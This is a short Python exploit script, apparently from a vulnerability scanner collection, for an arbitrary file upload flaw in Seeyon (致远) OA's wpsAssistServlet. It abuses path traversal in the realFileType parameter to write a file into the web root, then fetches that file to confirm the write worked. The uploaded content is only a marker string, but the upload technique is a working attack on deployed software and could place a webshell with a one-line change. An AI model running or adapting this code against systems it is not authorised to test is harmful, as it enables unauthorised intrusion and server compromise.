#!/usr/bin/env python
# coding=utf-8
# 致远OA wpsAssistServlet 任意文件上传漏洞
import requests, threading, base64
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        files = {
            'file': 'scan_vuln'
        }
        if url[-1] == '/':  # 因为如果有两个/就会报错
            urls = url + 'seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/66.txt&fileId=2'
        else:
            urls = url + '/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/66.txt&fileId=2'
        response = requests.post(url=urls, files=files, verify=False, timeout=20)
        bm = response.encoding  # 获取网页编码
        response.encoding = str(bm)  # 设置网页编码
        if 'officeTransResultFlag' in response.text:
            if url[-1] == '/':  # 因为如果有两个/就会报错
                urls = url + '/66.txt'
            else:
                urls = url + '/66.txt'
            responses = requests.get(url=urls, verify=False, timeout=20)
            bm = responses.encoding  # 获取网页编码
            responses.encoding = str(bm)  # 设置网页编码
            if "scan_vuln" in responses.text:
                print(colored('[+]存在致远OAwpsAssistServlet任意文件上传漏洞', 'red'))
                results = f'{url}-->存在致远OAwpsAssistServlet任意文件上传漏洞'
            else:
                print('[-]不存在致远OAwpsAssistServlet任意文件上传漏洞')
        else:
            print('[-]不存在致远OAwpsAssistServlet任意文件上传漏洞')
    except:
        print('[-]不存在致远OAwpsAssistServlet任意文件上传漏洞')


def zhiyuanOAwjuofile(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
